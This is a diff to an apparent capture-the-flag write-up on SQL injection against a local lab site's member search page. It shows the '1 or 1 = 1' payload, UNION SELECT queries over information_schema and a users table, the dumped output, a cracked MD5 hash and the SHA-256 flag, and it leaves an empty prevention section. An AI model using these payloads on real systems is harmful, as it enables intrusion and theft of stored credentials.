@@ -1,3 +1,19 @@
+```
+browsing to the Member page : http://localhost:8080/?page=member
+
+we have a field where we can search members using an id (integer)
+
+and the data is getting fetched from the database trying a random input we get prompted with syntax error returned from the SQL database which is mariadb lets try a straighforward input 
+
+1 or 1 = 1 
+
+we get all the entries returned to us so basicly the input field is vulnerable to SQL injection .  lets try UNION statement to make queries to the database and use the error returned from the database to guid us to some valuable data .
+
+Querying the metadata on a data source is the easiest way to determine the makeup of a table if you don’t have an understanding of it already.
+
+so i used information.schema to query the database trying to get information about all the tables then number of rows in each table
+
+
 --> 1 or 1 = 1 UNION SELECT t.TABLE_NAME, t.TABLE_ROWS FROM information_schema.TABLES AS t
 
 TABLE_SCHEMA  -- TABLE_NAME  --  TABLE_ROWS
@@ -29,6 +45,11 @@ First name: GetThe
 Surname : 5ff9d0165b4f92b14994e5c685cdce28
 
 
+
+
+
+
+
 --> 1 or 1 = 1 UNION SELECT t.last_name, t.Commentaire FROM users AS t 
 
 ID: 1 or 1 = 1 UNION SELECT t.last_name, t.Commentaire FROM users AS t 
@@ -45,3 +66,9 @@ Commentaire : Decrypt this password -> then lower all the char. Sh256 on it and 
 countersign : 5ff9d0165b4f92b14994e5c685cdce28
 
 5ff9d0165b4f92b14994e5c685cdce28 => md5 => FortyTwo => fortytwo => 10a16d834f9b1e4068b25c4c46fe0284e99e44dceaf08098fc83925ba6310ff5
+```
+
+
+***Prevention***
+```
+```
